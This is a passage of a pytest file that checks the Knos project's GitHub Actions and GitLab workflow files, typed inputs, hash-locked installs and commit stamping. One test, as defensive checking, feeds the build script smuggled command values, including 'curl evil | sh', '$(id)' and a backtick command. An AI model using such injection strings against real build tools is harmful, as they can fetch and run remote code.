    # the command line the brief names is the one that runs, with the payees only when there are some
    assert ATTEST_COMMAND.startswith('knos attest --repository "$R" --pull "$P" --order "$O" --kind "$K"')


def test_the_seller_calls_attest_by_hand_from_a_repository_of_his_own_and_it_asks_for_what_the_called_job_needs():
    doc = _doc(EXAMPLES / "knos-attest.yml")
    assert doc["name"] == "knos attest" and set(doc["on"]) == {"workflow_dispatch"} and doc["permissions"] == {}      # by hand and nothing else
    [(name, job)] = doc["jobs"].items()
    assert name == "attest" and set(job) == {"permissions", "uses", "with"} and "secrets" not in job
    assert job["uses"].startswith(f"{CALLED}attest.yml@")
    # it grants exactly what the called job asks for, no more: GitHub refuses a run in which a called job asks for more
    assert job["permissions"] == _jobs(ATTEST)["attest"]["permissions"] == {"contents": "read", "issues": "write", "id-token": "write"}
    # the same inputs the called workflow takes, handed over one for one; kind is a choice of the four
    mine, theirs = doc["on"]["workflow_dispatch"]["inputs"], _doc(WF / ATTEST)["on"]["workflow_call"]["inputs"]
    assert set(mine) == set(theirs) and {k: v["required"] for k, v in mine.items()} == {k: v["required"] for k, v in theirs.items()}
    assert mine["kind"]["type"] == "choice" and mine["kind"]["options"] == ["pay", "take", "revert", "rule", "eval"]       # eval: a buyer's, for knos_meter
    # a number input started by hand reaches the caller as text, and attest.yml's `pull` is a number: fromJSON makes it one
    # (C2: run 37179523007 of knos-seller-rc failed "Line: 77, Col: 13: Unexpected value '114'" with `${{ inputs.pull }}`)
    assert job["with"] == {k: "${{ fromJSON(inputs.pull) }}" if k == "pull" else f"${{{{ inputs.{k} }}}}" for k in ATTEST_INPUTS}
    text = (EXAMPLES / "knos-attest.yml").read_text(encoding="utf-8")
    said = _comments(EXAMPLES / "knos-attest.yml")
    for words in ("Actions > knos attest > Run workflow", "Nothing else starts it", "it writes one comment", "What it can do in this repository",
                  'the issue titled "knos tokens"', "What it cannot do: change anything else", "Why a run started by hand in your own repository is trusted",
                  "does not take your word", "you own the repository it ran in", "a personal account cannot give a machine of its own that label",
                  "it is no use for another", "A buyer who deletes his own workflow"):
        assert words in said, words
    assert not re.search(r"\bimmutable\b|nobody can change|audit", text, re.I)


def _with_type(value, caller: dict) -> str:
    """The type GitHub gives a `with:` value of a calling job when it evaluates it against the called workflow's typed
    inputs: "number", "boolean", "string", "any" (fromJSON: whatever the text says) or "unknown". An input of a run
    started by hand (`workflow_dispatch`) is text in the `inputs` context unless it is a boolean, and always text in
    `github.event.inputs`; an input of a called workflow keeps its declared type. Text around an expression makes a string."""
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, (int, float)):
        return "number"
    text = str(value)
    if "${{" not in text:
        return "string"
    m = re.fullmatch(r"\$\{\{\s*(.*?)\s*\}\}", text.strip(), re.S)
    if m is None:
        return "string"
    expr = m.group(1)
    if re.fullmatch(r"(?i)fromJSON\(.*\)", expr, re.S):
        return "any"
    if re.fullmatch(r"github\.event\.(pull_request|issue)\.number", expr):
        return "number"
    if re.fullmatch(r"github\.event\.inputs\.[\w-]+", expr):
        return "string"
    m = re.fullmatch(r"inputs\.([\w-]+)", expr)
    if m is None:
        return "unknown"
    by_hand = ((caller.get("workflow_dispatch") or {}).get("inputs") or {}).get(m.group(1))
    called = ((caller.get("workflow_call") or {}).get("inputs") or {}).get(m.group(1))
    if by_hand is not None:         # started by hand, it is text, whatever else could start it
        return "boolean" if by_hand.get("type") == "boolean" else "string"
    return (called or {}).get("type", "unknown")


def _callers() -> list[Path]:
    """Every file a repository installs or Knos runs that can call a reusable workflow: Knos's own, the examples (at any
    depth), and the copies the command line writes (src/knos/settle/*.yml). Not examples/gitlab: a .gitlab-ci.yml is
    read by GitLab, which has no reusable workflows, no `jobs` and none of GitHub's expressions."""
    found = {*WF.glob("*.yml"), *(p for p in EXAMPLES.rglob("*.yml") if GITLAB not in p.parents), *(ROOT / "src" / "knos" / "settle").glob("*.yml")}
    return sorted(p for p in found if "jobs" in (_doc(p) or {}))


def test_every_yaml_file_under_examples_is_read_by_the_tests_that_know_its_rules():
    """Three kinds, each with its own rules, and a file of no kind fails here instead of going unchecked:
    examples/*.yml are what a repository installs for payment (this file: `_files`, `_mine`); examples/adapters/*.yml
    start those workflows and sign nothing (tests/test_adapters.py reads each one, and `_callers` above); the file in
    examples/gitlab is GitLab's (tests/test_gitlab_pay.py holds the escrow's rules for its tokens), so none of
    GitHub's rules is asked of it here: only that it is YAML a pipeline can load."""
    every = {p.relative_to(EXAMPLES).as_posix() for ext in ("*.yml", "*.yaml") for p in EXAMPLES.rglob(ext)}
    top = {p.name for p in EXAMPLES.glob("*.yml")}
    adapters = {p.relative_to(EXAMPLES).as_posix() for p in (EXAMPLES / "adapters").glob("*.yml")}
    assert every == top | adapters | {"gitlab/.gitlab-ci.yml"}, sorted(every - top - adapters)
    assert top <= {p.name for p in _files()} and top <= {p.name for p in _mine()}
    assert adapters and {EXAMPLES / a for a in adapters} <= set(_callers())
    listed = (ROOT / "tests" / "test_adapters.py").read_text(encoding="utf-8")
    assert all(Path(a).name in listed or Path(a).stem in listed for a in adapters), "an adapter tests/test_adapters.py does not name"
    assert all("jobs" in _doc(EXAMPLES / a) and _doc(EXAMPLES / a)["permissions"] == {} for a in adapters)


def test_the_gitlab_example_is_yaml_a_pipeline_can_load_and_its_paying_job_reads_the_audience_it_was_given(tmp_path):
    """examples/gitlab/.gitlab-ci.yml as a YAML reader takes it (0.3.14's first copy was not YAML: a here-document in a
    plain list entry, and an entry holding `: `). Every job's script is a list of text, and the entry of knos-pay that
    splits the audience is one block of three lines that a shell runs as written: it gives the order, the head, the
    terms, the mode, the merge request and the payees."""
    import yaml
    doc = yaml.safe_load((GITLAB / ".gitlab-ci.yml").read_text(encoding="utf-8"))
    assert isinstance(doc, dict) and "jobs" not in doc and set(doc) == {"stages", ".knos", "knos-fund", "knos-pay"}
    jobs = {name: job for name, job in doc.items() if isinstance(job, dict)}
    assert all(isinstance(job.get("script", []), list) and all(isinstance(line, str) for line in job.get("script", [])) for job in jobs.values())
    assert doc[".knos"]["id_tokens"] == {"KNOS_TOKEN": {"aud": "$KNOS_AUD"}} and all(doc[j]["extends"] == ".knos" for j in ("knos-fund", "knos-pay"))
    script = doc["knos-pay"]["script"]
    [split] = [line for line in script if "<<EOF" in line]
    assert split == "IFS=: read -r _ _ ORDER HEAD TERMS MODE MR PAYEES <<EOF\n$KNOS_AUD\nEOF\n"
    assert 'jq -r .description mr.json | grep -qx "Knos-Pay-To: $ADDRESS"' in script and script[-1] == "printf '%s' \"$KNOS_TOKEN\" > knos-token.jwt"
    sh = shutil.which("sh")
    if sh is None:
        pytest.skip("no sh on this machine to run the script's lines with")
    payee, address = 900000000000000000 + 77, "EwSxyJFNQkNN9qtss4Qd7DTvrNYb62vgvhdwqgfErXDz"
    aud = f"knos3:pay:{'o' * 44}:{'a' * 40}:{'b' * 64}:0:12:{payee}.10000.{address}"
    lines = [split, script[script.index(split) + 1], script[script.index(split) + 2], 'echo "$ORDER $HEAD $TERMS $MODE $MR $PAYEE $SHARE $ADDRESS"']
    assert lines[1].startswith('PAYEE="${PAYEES%%.*}"') and lines[2].startswith('test "$SHARE" = 10000')
    r = subprocess.run([sh, "-ec", "\n".join(lines)], env={"KNOS_AUD": aud, "PATH": os.environ.get("PATH", "")}, capture_output=True, text=True, timeout=30, cwd=tmp_path, check=False)
    assert r.returncode == 0 and r.stdout.split() == ["o" * 44, "a" * 40, "b" * 64, "0", "12", str(payee), "10000", address], r.stdout + r.stderr
    split_share = subprocess.run([sh, "-ec", "\n".join(lines)], env={"KNOS_AUD": aud.replace(".10000.", ".5000."), "PATH": os.environ.get("PATH", "")}, capture_output=True, text=True,
                                 timeout=30, cwd=tmp_path, check=False)
    assert split_share.returncode != 0 and split_share.stdout == ""          # a split is not this example's to pay: the job ends before the token leaves it


def test_every_value_handed_to_a_typed_input_of_a_called_workflow_has_that_type_when_github_evaluates_it():
    """GitHub refuses a run, before any job starts, when a calling job hands a called workflow's `type: number` or
    `type: boolean` input a value of another type ("Unexpected value '114'"), and when it names an input the called
    workflow does not define or leaves out one it requires. C2 found examples/knos-attest.yml handing a number input
    started by hand (text) straight to attest.yml's number `pull`: every seller's settlement failed. This reads every
    caller as GitHub does. A called workflow outside this repository (the claim workflows of knos-oidc-rotate) is not
    read here, so what is handed to it from a run started by hand must be text of a text input, or go through fromJSON."""
    seen = 0
    for path in _callers():
        doc = _doc(path)
        caller = doc["on"] if isinstance(doc["on"], dict) else {}
        for name, job in doc["jobs"].items():
            uses = str(job.get("uses") or "")
            if not uses:
                continue
            m = re.fullmatch(rf"(?:{re.escape(CALLED)}|\./\.github/workflows/)([\w.-]+\.yml)(?:@{SHA}|@KNOS_WORKFLOWS_SHA)?", uses)
            given = job.get("with") or {}
            where = f"{path.relative_to(ROOT).as_posix()} job {name}"
            if m is None:           # not one of Knos's published workflows: only the caller's side can be checked
                for k, v in given.items():
                    got, by_hand = _with_type(v, caller), ((caller.get("workflow_dispatch") or {}).get("inputs") or {})
                    src = re.fullmatch(r"\$\{\{\s*inputs\.([\w-]+)\s*\}\}", str(v).strip())
                    if src and src.group(1) in by_hand:
                        assert by_hand[src.group(1)].get("type", "string") in ("string", "choice"), \
                            f"{where} hands `{k}` the {by_hand[src.group(1)].get('type')} input `{src.group(1)}` started by hand, which arrives as text: wrap it in fromJSON"
                    assert got != "unknown" or "${{" not in str(v), f"{where}: `{k}: {v}` is an expression this test cannot type"
                continue
            inputs = ((_doc(WF / m.group(1))["on"].get("workflow_call") or {}).get("inputs") or {})
            assert set(given) <= set(inputs), f"{where} hands {sorted(set(given) - set(inputs))}, which {m.group(1)} does not define"
            missing = [k for k, v in inputs.items() if v.get("required") and k not in given]
            assert not missing, f"{where} leaves out {missing}, which {m.group(1)} requires"
            for k, v in given.items():
                want, got = inputs[k].get("type", "string"), _with_type(v, caller)
                seen += 1
                if want in ("number", "boolean"):
                    assert got in (want, "any"), f"{where}: `{k}: {v}` is {got} when GitHub evaluates it, and {m.group(1)}'s `{k}` is a {want}"
    assert seen >= 5            # knos-attest.yml's five, at least: the check reads the files it means to
    # the rule itself, on what GitHub did with the file C2 ran and with the fixed one
    by_hand = {"workflow_dispatch": {"inputs": {"pull": {"type": "number"}, "go": {"type": "boolean"}, "who": {"type": "string"}}}}
    called = {"workflow_call": {"inputs": {"pull": {"type": "number"}}}}
    assert _with_type("${{ inputs.pull }}", by_hand) == "string"                 # Unexpected value '114'
    assert _with_type("${{ fromJSON(inputs.pull) }}", by_hand) == "any"
    assert _with_type("${{ inputs.pull }}", {**by_hand, **called}) == "string"   # either way it may be started, it is text by hand
    assert _with_type("${{ inputs.pull }}", called) == "number" and _with_type("${{ inputs.go }}", by_hand) == "boolean"
    assert _with_type("${{ github.event.inputs.go }}", by_hand) == "string" and _with_type("#${{ github.event.issue.number }}", by_hand) == "string"
    assert _with_type(114, by_hand) == "number" and _with_type("${{ github.event.pull_request.number }}", by_hand) == "number"


def test_a_job_that_waits_for_a_relayer_outlasts_the_wait_so_it_can_say_what_became_of_the_token():
    """A job whose command can hand its token to Knos's public relay waits up to knos.flow.RELAY_WAIT for the relay's
    word, then says what became of it. C2 (knos-seller-rc run 37180149403): attest.yml's 10 minutes cancelled the job
    the very second the wait ran out, so the seller read "The operation was canceled" instead of what to do next."""
    from knos import flow
    for name, job in SIGNS:
        minutes = _jobs(name)[job]["timeout-minutes"]
        assert minutes * 60 >= flow.RELAY_WAIT + 4 * 60, f"{name} job {job}: {minutes} minutes leave no time after the {flow.RELAY_WAIT // 60}-minute wait"


def test_the_attestor_calls_the_two_pinned_workflows_by_hand_or_on_a_timer_and_hands_them_its_read_token():
    """examples/knos-attestor.yml: what an organisation commits to ONE repository, for its private ones. It is a caller
    like knos.yml: two thin jobs, the pinned commit, no inputs handed on, the secrets by name."""
    from knos import flow, policy
    doc, text = _doc(EXAMPLES / "knos-attestor.yml"), (EXAMPLES / "knos-attestor.yml").read_text(encoding="utf-8")
    assert doc["name"] == "knos attestor" and set(doc["on"]) == {"schedule", "workflow_dispatch"} and doc["permissions"] == {}
    assert doc["on"]["schedule"] == [{"cron": "*/15 * * * *"}] and "concurrency" not in doc      # the called jobs keep their own lines
    inputs = doc["on"]["workflow_dispatch"]["inputs"]
    assert list(inputs) == ["repository", "issue", "pull"]                    # the names knos.flow reads from the event
    assert all(i["required"] is False and i["type"] == "string" and i["default"] == "" and i["description"] for i in inputs.values())
    jobs = doc["jobs"]
    assert list(jobs) == ["command", "settle"] and [jobs[j]["name"] for j in jobs] == ["knos command", "knos settle"]
    assert [jobs[j]["uses"].split("@")[0] for j in jobs] == [CALLED + "fund.yml", CALLED + "prove.yml"]
    assert jobs["settle"]["needs"] == "command" and jobs["settle"]["if"] == "!cancelled()" and "if" not in jobs["command"]
    pin = _script("pinned_workflows").pin()
    for name, job in jobs.items():
        assert set(job) <= {"name", "needs", "if", "permissions", "uses", "secrets"} and job["uses"].endswith("@" + pin), name
        assert job["permissions"] == MINTS                                    # what the jobs of the called workflow ask for between them
        assert job["secrets"] == {"KNOS_READ_TOKEN": "${{ secrets.KNOS_READ_TOKEN }}", "KNOS_RELAY_KEY": "${{ secrets.KNOS_RELAY_KEY }}"}
    assert "inherit" not in json.dumps(jobs) and set(re.findall(r"secrets\.(\w+)", text)) == {"KNOS_READ_TOKEN", "KNOS_RELAY_KEY"}
    # both events start both called jobs, and only those: nothing reviews or judges in an attestor
    for context in (_event("schedule", {"schedule": "*/15 * * * *"}), _event("workflow_dispatch", {"inputs": {"repository": "acme/app", "issue": "7", "pull": ""}})):
        assert _started(doc, context) == {"command", "settle"} and _started(doc, context, cancelled=True) == set()
        assert {job for job, spec in _jobs("fund.yml").items() if "needs" not in spec and runs(spec.get("if"), context)} == {"command"}
        assert {job for job, spec in _jobs("prove.yml").items() if "needs" not in spec and runs(spec.get("if"), context)} == {"settle"}
    # what an adopter reads: each trigger, what the file can and cannot do, what is public, and the policy that turns it on
    head, said = text.split("\nname:")[0], _comments(EXAMPLES / "knos-attestor.yml")
    assert all(ln.startswith("#") for ln in head.splitlines()) and all(f"(`{trigger}`)" in head for trigger in doc["on"])
    for words in ("What it can do in this repository", "What it cannot do", "It checks no target out and runs nothing from one", "KNOS_READ_TOKEN is needed",
                  "issues and pull requests to read and write", "KNOS_RELAY_KEY is optional", "the id of the commit that was accepted", 'issue titled "knos tokens"',
                  "its policy file names the targets", "list this repository among the repositories that may spend it", "It does not use `pull_request_target`",
                  "every 15 minutes", f"the last {flow.SCAN_DAYS} days", "They accept no inputs"):
        assert words in said, words
    assert not re.search(r"\bimmutable\b|nobody can change|audit", text, re.I)
    # the policy the file's own comments show is one knos.policy reads, and it names an attestor and its targets
    shown = "\n".join(ln[1:].strip() for ln in head.splitlines() if re.match(r"#     (private|attestor|targets):", ln))
    p = policy.load(shown)
    assert (p.private, p.attestor, p.targets) == (True, "acme/knos-settle", ("acme/app", "acme/api")) and policy.attests(p, "acme/knos-settle", "acme/api") == (True, "")


def test_the_canary_measures_as_a_user_sees_it_with_a_token_of_its_own_and_installs_by_hash():
    doc = _doc(EXAMPLES / "knos-canary.yml")
    assert doc["name"] == "knos canary" and set(doc["on"]) == {"schedule", "workflow_dispatch"} and doc["permissions"] == {}
    assert doc["on"]["schedule"] == [{"cron": "*/30 * * * *"}]                  # every 30 minutes
    assert doc["concurrency"] == {"group": "knos-canary", "cancel-in-progress": False}      # one measurement at a time
    [(name, job)] = doc["jobs"].items()
    assert name == "canary" and job["permissions"] == {"contents": "read"} and job["runs-on"] == "ubuntu-24.04"
    # the one secret is a token of the owner's, read by the one step that runs the command; the job's own token only reads
    text = (EXAMPLES / "knos-canary.yml").read_text(encoding="utf-8")
    code = "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))
    assert re.findall(r"secrets\.(\w+)", code) == ["KNOS_CANARY_TOKEN"] and "id-token" not in code and "KNOS_RELAY_KEY" not in code
    [command] = [s for s in _steps(job) if s.get("run") == "knos canary"]
    assert command["env"] == {"GH_TOKEN": "${{ secrets.KNOS_CANARY_TOKEN }}"} and "secrets." not in json.dumps([s for s in _steps(job) if s is not command])
    # it sees a secret, so it installs the list the pinned workflows install from, by hash, read at the pinned commit
    [uv] = _steps(job, "astral-sh/setup-uv@")
    assert uv["with"]["enable-cache"] is False and not _caches({"steps": _steps(job)})
    [install] = _installs(job)
    pin = _script("pinned_workflows").pin()
    assert install.endswith(f"-r https://raw.githubusercontent.com/{CALLED.split('/.github')[0]}/{pin}/requirements/sign.txt")
    assert not _unhashed({"permissions": {}, "jobs": {"canary": job}})          # it sees a secret, so the rule holds for it
    said = _comments(EXAMPLES / "knos-canary.yml")
    for words in ("every 30 minutes", "test USDC", "funds an issue", "records the seconds", "What it can do in this repository",
                  "What it cannot do", "starts no workflow run", "fine-grained personal access token", "hash-locked list"):
        assert words in said, words
    assert not re.search(r"\bimmutable\b|nobody can change", text, re.I)


# ---- the published copies, and the one commit everything names -----------------------------------------------------------

WHEEL = b"PK\x03\x04 a wheel, as far as the lock can tell"      # what a release's `uv build` made: only its hash matters here


def _lock(tmp_path: Path, pub, release: str | None = None) -> Path:
    """The sign.txt a release writes for a wheel (`lock`), and the wheel's hash it must hold."""
    wheel = tmp_path / f"knos-{release or _release()}-py3-none-any.whl"
    wheel.write_bytes(WHEEL)
    out = tmp_path / "sign.txt"
    assert pub.main(["lock", str(wheel), "--out", str(out)]) == 0
    return out


def test_the_published_set_is_the_source_byte_for_byte_with_the_lock_written_in(tmp_path, capsys, monkeypatch):
    pub = _script("pinned_workflows")
    out, lock = tmp_path / "knos-workflows", _lock(tmp_path, pub)
    assert pub.main(["build", str(out), "--lock", str(lock)]) == 0
    files = sorted(p.relative_to(out).as_posix() for p in out.rglob("*") if p.is_file())
    assert files == [".github/workflows/attest.yml", ".github/workflows/check.yml", ".github/workflows/fund.yml", ".github/workflows/prove.yml",
                     "LICENSE", "README.md", "requirements/sign.txt"]
    # the lock: requirements/sign.txt of this repository, and the wheel by its hash as the last line
    text = lock.read_text(encoding="utf-8")
    third_party = pub.third_party()             # requirements/sign.txt without the wheel's line, whether the tree is locked or not
    assert text == third_party + f"knos=={_release()} --hash=sha256:{hashlib.sha256(WHEEL).hexdigest()}\n"
    assert (out / "requirements" / "sign.txt").read_text(encoding="utf-8") == text
    for name in PUBLISHED:
        published, source = (out / ".github" / "workflows" / name).read_text(encoding="utf-8"), (WF / name).read_text(encoding="utf-8")
        assert "KNOS_LOCK" not in published, name                          # written in everywhere it stood
        assert published.count(text.rstrip("\n").splitlines()[-1]) == sum(1 for j in _jobs(name) if (name, j) in SIGNS), name
        for job_name, job in _doc(out / ".github" / "workflows" / name)["jobs"].items():
            if (name, job_name) in SIGNS:    # the published job installs from exactly the published list, hash by hash
                run = _installer(job)["run"]
                assert run.split("<<'LOCK'\n")[1].split("\nLOCK\n")[0] == text.rstrip("\n"), (name, job_name)
                assert "--require-hashes" in run
        # and in the source it is the one word KNOS_LOCK in those jobs, so an unfilled copy installs nothing
        assert source.count("\n          KNOS_LOCK\n") == sum(1 for j in _jobs(name) if (name, j) in SIGNS), name
    assert (out / "LICENSE").read_bytes() == (ROOT / "LICENSE").read_bytes()
    readme = (out / "README.md").read_text(encoding="utf-8")
    assert f"knos {_release()} from PyPI" in readme and "REHEARSAL" not in readme and all(f"`.github/workflows/{n}`" in readme for n in PUBLISHED)
    assert "names this repository and one commit of it" in readme and not re.search(r"\bimmutable\b|nobody can change", readme, re.I)
    assert "--require-hashes" in readme and "requirements/sign.txt" in readme
    assert pub.REPO == CALLED.split("/.github")[0] and pub.main(["check", str(out), "--lock", str(lock)]) == 0
    assert "byte for byte" in capsys.readouterr().out
    # check sees one changed byte, a missing file and a file that does not belong; a checkout's .git is not looked at
    (out / ".git").mkdir()
    (out / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    assert pub.main(["check", str(out), "--lock", str(lock)]) == 0
    prove = out / ".github" / "workflows" / "prove.yml"
    prove.write_bytes(prove.read_bytes().replace(b"--sandbox require", b"--sandbox auto"))
    (out / ".github" / "workflows" / "relay.yml").write_text("name: stray\n", encoding="utf-8")
    (out / "LICENSE").unlink()
    (out / "requirements" / "sign.txt").write_text(third_party, encoding="utf-8")          # the list without the wheel
    capsys.readouterr()
    assert pub.main(["check", str(out), "--lock", str(lock)]) == 1
    said = capsys.readouterr().out
    assert ".github/workflows/prove.yml is not the file this repository publishes" in said and "LICENSE is missing" in said
    assert "requirements/sign.txt is not the file this repository publishes" in said
    assert ".github/workflows/relay.yml is not part of the published set" in said and "fund.yml" not in said
    assert pub.main(["build", str(out), "--lock", str(lock)]) == 0 and pub.main(["check", str(out), "--lock", str(lock)]) == 1       # writing again repairs; a stray file is still said
    # (as a tree is before its lock: with no lock of its own, `build DIR` and `check DIR` have nothing to publish from)
    monkeypatch.setattr(pub, "locked", lambda: None)
    for bad in ([], ["build"], ["stamp"], ["check", "--source", "knos"], ["publish", str(out)], ["build", str(out)],
                ["build", str(out), "--lock", str(lock), "--source", "knos"], ["check", str(out)], ["lock"]):
        with pytest.raises(SystemExit):
            pub.main(bad)


def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_the_list_exactly(tmp_path, capsys):
    pub = _script("pinned_workflows")
    # a wheel of another release, or a file that is not a wheel of knos, gets no lock
    other = tmp_path / "knos-9.9.9-py3-none-any.whl"
    other.write_bytes(WHEEL)
    with pytest.raises(SystemExit, match=f"knos 9.9.9, but the workflows install knos {_release()}"):
        pub.main(["lock", str(other)])
    stray = tmp_path / "knos.tar.gz"
    stray.write_bytes(WHEEL)
    with pytest.raises(SystemExit, match="is not a knos wheel"):
        pub.main(["lock", str(stray)])
    # printed when no file is named
    wheel = tmp_path / f"knos-{_release()}-py3-none-any.whl"
    wheel.write_bytes(WHEEL)
    assert pub.main(["lock", str(wheel)]) == 0 and capsys.readouterr().out.splitlines()[-1] == f"knos=={_release()} --hash=sha256:{hashlib.sha256(WHEEL).hexdigest()}"
    # build takes only a lock that is the list and one line for this release's wheel
    lock = _lock(tmp_path, pub)
    good = lock.read_text(encoding="utf-8")
    last = good.splitlines()[-1]
    for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.14 --hash=sha256:" + "a" * 64 + "\n"):
        bad = tmp_path / "bad.txt"
        bad.write_text(wrong, encoding="utf-8")
        with pytest.raises(SystemExit, match="the lock is not"):
            pub.main(["build", str(tmp_path / "never"), "--lock", str(bad)])
    assert not (tmp_path / "never").exists()
    with pytest.raises(SystemExit, match="cannot read the lock"):
        pub.main(["build", str(tmp_path / "never"), "--lock", str(tmp_path / "missing.txt")])


def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_else(tmp_path, capsys, monkeypatch):
    pub = _script("pinned_workflows")
    spec = "git+https://github.com/drexthealpha/Knos@" + "ab" * 20
    out = tmp_path / "staging"
    assert pub.main(["build", str(out), "--source", spec]) == 0 and "REHEARSAL" in capsys.readouterr().out
    deps = pub.third_party()                    # requirements/sign.txt without the wheel's line, whether the tree is locked or not
    again = f'uv pip install --no-config --python "$RUNNER_TEMP/knos/bin/python" --no-deps "{spec}"'
    for name in PUBLISHED:
        source, got = (WF / name).read_text(encoding="utf-8"), (out / ".github" / "workflows" / name).read_text(encoding="utf-8")
        # a job that signs nothing: the requirement in the install line and nothing else. A job that signs: the
        # third-party list by hash, then knos from the source (no hash can cover it), and nothing else.
        want = source.replace(f'"knos=={_release()}"', f'"{spec}"')
        want = re.sub(r"(?m)^( +)KNOS_LOCK\n( +)LOCK\n", lambda m: "".join(m.group(1) + ln + "\n" for ln in deps.splitlines()) + f"{m.group(2)}LOCK\n{m.group(2)}{again}\n", want)
        assert got == want, name
        assert "KNOS_LOCK" not in got and not re.search(r"(?m)^ +knos==\S+ --hash", got), name         # no wheel line: there is no wheel
    assert (out / "requirements" / "sign.txt").read_text(encoding="utf-8") == deps
    assert "REHEARSAL VARIANT" in (out / "README.md").read_text(encoding="utf-8") and spec in (out / "README.md").read_text(encoding="utf-8")
    # a staging checkout is checked against the same variant, and is never taken for the published set
    assert pub.main(["check", str(out), "--source", spec]) == 0
    if pub.locked():                                       # a locked tree compares it with its own published set: not that
        assert pub.main(["check", str(out)]) == 1
    with monkeypatch.context() as m:                       # before the lock there is no set to take it for
        m.setattr(pub, "locked", lambda: None)
        with pytest.raises(SystemExit):
            pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
    assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
    capsys.readouterr()
    for bad in ('knos"; curl evil | sh; "', "knos==0.3.14 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
        with pytest.raises(SystemExit):
            pub.main(["build", str(tmp_path / "bad"), "--source", bad])
    assert not (tmp_path / "bad").exists()


def _tree(tmp_path: Path, pub) -> Path:
    """A copy of the files that name the published commit, for `stamp` to write into."""
    root = tmp_path / "repo"
    for rel in ["examples", ".github/workflows", "web/front.js", "src/knos/settle/knos-claim.yml", "README.md", "LICENSE", "requirements"]:
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (shutil.copytree if (ROOT / rel).is_dir() else shutil.copyfile)(ROOT / rel, root / rel)
    now = pub.pin()
    (root / "docs" / "img").mkdir(parents=True)
    (root / "docs" / "INSTALL.md").write_text(f"    uses: {CALLED}fund.yml@{now}\n\nThe commit is `{now}`.\n", encoding="utf-8")
    (root / "docs" / "img" / "logo.png").write_bytes(b"\x89PNG\r\n\xff\xfe" + now.encode())      # not text: left alone
    return root


def test_stamp_names_one_commit_everywhere_and_check_says_every_place_that_disagrees(tmp_path, monkeypatch, capsys):
    pub = _script("pinned_workflows")
    root = _tree(tmp_path, pub)
    before = pub.pin()
    monkeypatch.setattr(pub, "ROOT", root)
    assert pub.main(["check"]) == 0
    first, second = "ab" * 20, "cd" * 20
    named = [root / "examples" / "knos-workflow.yml", root / "examples" / "knos-check.yml", root / ".github" / "workflows" / "knos.yml",
             root / ".github" / "workflows" / "knos-check.yml", root / "docs" / "INSTALL.md", root / "web" / "front.js"]
    for sha, old in ((first, before), (second, first)):        # a release, then the next one
        assert pub.main(["stamp", sha]) == 0 and "Named drexthealpha/knos-workflows@" + sha in capsys.readouterr().out
        for path in named:
            text = path.read_text(encoding="utf-8")
            assert f"{CALLED}fund.yml@{sha}" in text or f"{CALLED}check.yml@{sha}" in text, path.name
            assert f"@{old}" not in text and (path.name == "front.js" or old not in text), path.name
        assert f"The commit is `{sha}`." in (root / "docs" / "INSTALL.md").read_text(encoding="utf-8")
        # the seller's caller and the canary are stamped too: the workflow, and the published list read at the commit
        assert f"{CALLED}attest.yml@{sha}" in (root / "examples" / "knos-attest.yml").read_text(encoding="utf-8")
        assert f"knos-workflows/{sha}/requirements/sign.txt" in (root / "examples" / "knos-canary.yml").read_text(encoding="utf-8")
        assert pub.pin() == sha and pub.main(["check"]) == 0 and sha in capsys.readouterr().out
        for example, own in OWN.items():
            assert (root / "examples" / example).read_bytes() == (root / ".github" / "workflows" / own).read_bytes()
        js = (root / "web" / "front.js").read_text(encoding="utf-8")
        body = re.search(r"export const WORKFLOW = `(.*?)`;\n", js, re.DOTALL).group(1)
        assert re.sub(r"\\(.)", r"\1", body, flags=re.DOTALL) == (root / "examples" / "knos-workflow.yml").read_text(encoding="utf-8")
    assert before.encode() in (root / "docs" / "img" / "logo.png").read_bytes()
    # the reusable workflows themselves name no commit of their own repository: stamping never touches them
    for name in PUBLISHED:
        assert (root / ".github" / "workflows" / name).read_bytes() == (WF / name).read_bytes()
    assert pub.stamp(second) == []                                     # stamping the same commit again changes nothing
    for bad in ("main", "v0.3.12", second[:39], second.upper(), ""):
        with pytest.raises(SystemExit):
            pub.main(["stamp", bad])
    # check: a copy edited by hand, a document left at another commit or at the placeholder, a workflow nobody publishes
    own = root / ".github" / "workflows" / "knos.yml"
    own.write_text(own.read_text(encoding="utf-8").replace("needs: command", "needs:  command"), encoding="utf-8")
    (root / "docs" / "OLD.md").write_text(f"{CALLED}prove.yml@{first} and {CALLED}relay.yml@{second}, once {PLACEHOLDER}; "
                                          f"-r https://raw.githubusercontent.com/drexthealpha/knos-workflows/{first}/requirements/sign.txt\n", encoding="utf-8")
    page = root / "web" / "front.js"
    page.write_text(page.read_text(encoding="utf-8").replace("types: [created]", "types: [created, edited]"), encoding="utf-8")
    capsys.readouterr()
    assert pub.main(["check"]) == 1
    said = capsys.readouterr().out
    for line in (".github/workflows/knos.yml is not examples/knos-workflow.yml", f"docs/OLD.md names drexthealpha/knos-workflows at {first}",
                 "docs/OLD.md names relay.yml, which drexthealpha/knos-workflows does not publish", f"docs/OLD.md still says {PLACEHOLDER}",
                 f"docs/OLD.md reads requirements/sign.txt of drexthealpha/knos-workflows at {first}",
                 "web/front.js does not hand out examples/"):
        assert line in said, line
    assert "docs/INSTALL.md" not in said and "examples/" + "knos-check.yml" not in said


def test_the_site_templates_are_the_examples_byte_for_byte(tmp_path, monkeypatch):
    """scripts/front_workflow.py writes the two files a repository installs into web/front.js as template literals.
    Evaluated as JavaScript would, each is the example itself, backslashes, backticks and `${{ }}` included."""
    front = _script("front_workflow")
    assert front.main(["--check"]) == 0, "web/front.js does not hand out examples/: run python scripts/front_workflow.py"
    page = tmp_path / "front.js"
    page.write_text('export const KNOS_WORKFLOWS_SHA = "old";\nexport const WORKFLOW = `old ${x}`;\nconst kept = 1;\n'
                    "export const CHECK_WORKFLOW = `old`;\nexport function f() {}\n", encoding="utf-8")
    monkeypatch.setattr(front, "FRONT", page)
